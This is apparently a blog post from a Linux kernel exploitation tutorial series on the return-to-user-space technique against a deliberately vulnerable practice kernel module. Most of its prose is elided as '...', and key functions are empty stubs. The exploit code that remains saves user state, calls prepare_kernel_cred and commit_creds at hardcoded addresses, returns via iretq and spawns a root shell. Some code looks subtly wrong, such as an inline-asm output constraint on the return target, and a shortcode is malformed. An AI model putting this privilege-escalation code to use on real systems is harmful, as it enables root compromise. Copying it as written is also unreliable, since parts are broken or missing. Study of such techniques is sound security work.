+++
tags = ["linux","kernel"]
categories = ["Linux Kernel Exploitation"]
date = "2022-01-25"
description = "Our first kernel exploitation technique, returning to user-space. Part two of a series of posts on Linux kernel exploitation techniques."
featuredpath = "date"
linktitle = ""
title = "Linux Kernel :: 0x01 :: Return to User-space"
slug = "linux-kernel-1-ret2usr"
type = "post"
+++

## Table of Contents
 1. [User-space vs. Kernel-space](#user-space-vs-kernel-space)
 2. [Return to User-space Overview](#return-to-user-space-overview)
 3. [Saving the Initial State](#saving-the-initial-state)
 4. [Restoring the Initial State](#restoring-the-initial-state)
 5. [Escalating Privileges in the Kernel](#escalating-privileges-in-the-kernel)
 6. [A Vulnerable Kernel Module](#a-vulnerable-kernel-module)
 7. [Exploiting the Kernel Module](#exploiting-the-kernel-module)
 8. [Environment Setup](#environment-setup)
 9. [Putting it All Together](#putting-it-all-together)


## User-space vs. Kernel-space
...


## Return to User-space Overview
...


## Saving the Initial State
...

```c
unsigned long save_ss, save_sp, save_rf, save_cs;

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    );
}
```


## Restoring the Initial State
...

```c
void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, save_ss;"
        "push r15;"
        "mov r15, save_sp;"
        "push r15;"
        "mov r15, save_rf;"
        "push r15;"
        "mov r15, save_cs;"
        "push r15;"
        "mov r15, %[rip];"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        : [rip] "=&r" (target)
    );
}
```


## Escalating Privileges in the Kernel
...

```asm
xor    rdi, rdi
movabs rbx, 0xffffffff810881c0  // prepare_kernel_cred
call   rbx
movabs rbx, 0xffffffff81087e80  // commit_creds
mov    rdi, rax
call   rbx
```

...

```c
void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
        "call rbx;"
        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
        "mov rdi, rax;"
        "call rbx;"
        ".att_syntax;"
    );

    /* return to user-space */
    load_user_space(/* target return address */);
}
```


## A Vulnerable Kernel Module
...

[challenge.c](/files/linux-kernel/1/challenge.c)

{{< code language="c" title="challenge.c" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

struct proc_dir_entry *proc_entry;

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    // vulnerable read function
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    // vulnerable write function
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

int init_module(void)
{
    proc_entry = proc_create("challenge", 0666, NULL, &fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
{{< /code >}}

...

```c
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    // vulnerable read function
}
```

...

```c
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    // vulnerable write function
}
```

## Exploiting the Kernel Module
...

```c
unsigned long leak_canary(int fd)
{
    // ...
}
```

...

```c
void overflow_buffer(int fd, unsigned long canary)
{
    // ...
}
```


## Environment Setup
...

{{< code language="sh" title="launch.sh" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-5.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -append "console=ttyS0 nokaslr quiet"
{{< /code }}

...

```
~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
/ # id
uid=0(root) gid=0
```


## Putting it All Together
...

```c
void shell()
{
    system("/bin/sh");
}
```

...

```c
int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
```

...

[exploit.c](/files/linux-kernel/1/exploit.c)

{{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, save_ss;"
        "push r15;"
        "mov r15, save_sp;"
        "push r15;"
        "mov r15, save_rf;"
        "push r15;"
        "mov r15, save_cs;"
        "push r15;"
        "mov r15, %[rip];"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        : [rip] "=&r" (target)
    );
}

void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
        "call rbx;"
        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
        "mov rdi, rax;"
        "call rbx;"
        ".att_syntax;"
    );

    /* return to user-space */
    load_user_space((unsigned long)shell);
}

unsigned long leak_canary(int fd)
{
    // ...
}

void overflow_buffer(int fd, unsigned long canary)
{
    // ...
}

int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
{{< /code >}}

...

```
~/ $ gcc exploit.c -o exploit -static
```

...

```
/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
/ # uid=0(root) gid=0
```
